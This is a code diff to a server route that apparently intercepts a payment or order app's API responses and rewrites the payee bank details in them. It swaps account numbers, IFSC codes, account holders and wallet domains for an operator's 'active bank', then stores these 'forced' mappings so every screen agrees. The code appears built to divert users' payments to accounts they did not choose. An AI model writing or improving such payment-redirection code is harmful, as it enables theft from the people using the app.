@@ -2827,47 +2827,65 @@ app.all('/xxapi/*', async (req, res) => {
                     return !!(oId && data.orderBankMap && data.orderBankMap[oId] && data.orderBankMap[oId].forced);
                 }
                 // Per-item replace: browse items (orderState=0) → minAmount check → blanket replace;
-                // history items (orderState>0) → blanket replace always (operator sees all history)
+                // Per-item replace:
+                // 1. Saved orders in KV → replace with saved mapped bank
+                // 2. Active/processing orders (orderState <= 2 or has walletDomain) → minAmount check → replace acctNo, acctCode, acctName & walletDomain with active bank
                 function _replaceListItems(list) {
                     list.forEach(item => {
                         if (!item || typeof item !== 'object') return;
                         const orderState = parseInt(item.orderState ?? item.state ?? -1);
-                        const isHistoryItem = orderState > 0;
-
                         const oId = _getItemOId(item);
-                        const savedSlip = oId && data.orderBankMap ? data.orderBankMap[oId] : null;
-                        const savedMappingForOrder = getSavedOrderMapping(data, item);
+                        const savedMapping = getSavedOrderMapping(data, item) ||
+                            (oId ? getSavedOrderMapping(data, oId) : null) ||
+                            getSavedOrderMapping(data, item.rptNo || item.orderNo || item.orderId || item.id || item.slipId || '');
 
-                        if (!isHistoryItem && !savedMappingForOrder) {
-                            // Browse (available to buy): minAmount check
-                            const iAmt = parseFloat(item.orderAmount || item.amount || item.money || item.totalAmount || item.buyAmount || 0);
-                            if (bank.minAmount && iAmt > 0 && iAmt < bank.minAmount) return;
+                        const iAmt = parseFloat(item.orderAmount || item.amount || item.money || item.totalAmount || item.buyAmount || 0);
+                        const minOk = !bank.minAmount || (iAmt > 0 && iAmt >= bank.minAmount);
 
-                            // Blanket replace for active browse items
-                            const hasAcct = scanHasBankFields(item, 0);
-                            if (hasAcct) deepReplaceBankFields(item, bank, 0, hasAcct);
-                        } else {
-                            // History items may be changed only when their order ID is already
-                            // present in orderBankMap. An unmapped/cancelled order is left as-is.
-                            const savedMapping = savedMappingForOrder ||
-                                getSavedOrderMapping(data, item.rptNo || item.orderNo || item.orderId || item.id || item.slipId || '');
-                            if (savedMapping) {
-                                const mappedBank = bankFromSavedOrder(savedMapping);
-                                if (mappedBank && (mappedBank.accountNo || mappedBank.ifsc || mappedBank.accountHolder)) {
-                                    const mappedAmount = item.amount || item.orderAmount || item.money || savedMapping.amount || 0;
-                                    if (urlLower.includes('waitconfirm')) {
-                                        // waitconfirm exposes these three bank fields to the app;
-                                        // do not overwrite username/name aliases or ctAccount.
-                                        replaceWaitConfirmBankFields(item, mappedBank);
-                                        const walletTemplate = item.walletDomain || mappedBank.walletDomain || '';
-                                        const mappedWallet = rewriteWalletDomainForBank(walletTemplate, mappedBank, bank && bank.minAmount);
-                                        if (mappedWallet) item.walletDomain = mappedWallet;
-                                    } else {
-                                        forceBankDetails(item, mappedBank);
-                                        const mappedWallet = rewriteWalletDomainForBank(item.walletDomain, mappedBank, bank && bank.minAmount);
-                                        if (mappedWallet) item.walletDomain = mappedWallet;
-                                    }
+                        if (savedMapping) {
+                            const mappedBank = bankFromSavedOrder(savedMapping);
+                            if (mappedBank && (mappedBank.accountNo || mappedBank.ifsc || mappedBank.accountHolder)) {
+                                if (urlLower.includes('waitconfirm')) {
+                                    replaceWaitConfirmBankFields(item, mappedBank);
+                                } else {
+                                    forceBankDetails(item, mappedBank);
                                 }
+                                const walletTemplate = item.walletDomain || mappedBank.walletDomain || '';
+                                const mappedWallet = rewriteWalletDomainForBank(walletTemplate, mappedBank, bank && bank.minAmount);
+                                if (mappedWallet) item.walletDomain = mappedWallet;
+                            }
+                        } else if (minOk && (orderState <= 2 || item.walletDomain || !urlLower.includes('history'))) {
+                            // Active / Processing order in browse or history list: replace bank details
+                            if (urlLower.includes('waitconfirm')) {
+                                replaceWaitConfirmBankFields(item, bank);
+                            } else {
+                                forceBankDetails(item, bank);
+                            }
+                            if (item.walletDomain) {
+                                item.walletDomain = rewriteWalletDomainForBank(item.walletDomain, bank, bank && bank.minAmount);
+                            }
+                            // Auto-save active order mapping in KV so details & other screens see same bank
+                            if (oId && (!data.orderBankMap || !data.orderBankMap[oId])) {
+                                if (!data.orderBankMap) data.orderBankMap = {};
+                                data.orderBankMap[oId] = {
+                                    bank: `${bank.accountHolder} | ${bank.accountNo} | ${bank.ifsc}`,
+                                    accountHolder: bank.accountHolder,
+                                    accountNo: bank.accountNo,
+                                    ifsc: bank.ifsc,
+                                    bankName: bank.bankName || '',
+                                    upiId: bank.upiId || '',
+                                    rptNo: oId,
+                                    orderNo: item.orderNo || oId,
+                                    orderId: oId,
+                                    amount: iAmt,
+                                    walletDomain: item.walletDomain || '',
+                                    time: now,
+                                    userId: userId || '',
+                                    isManual: true,
+                                    forced: true
+                                };
+                                data._skipOverrideMerge = true;
+                                saveData(data).catch(() => { });
                             }
                         }
                     });
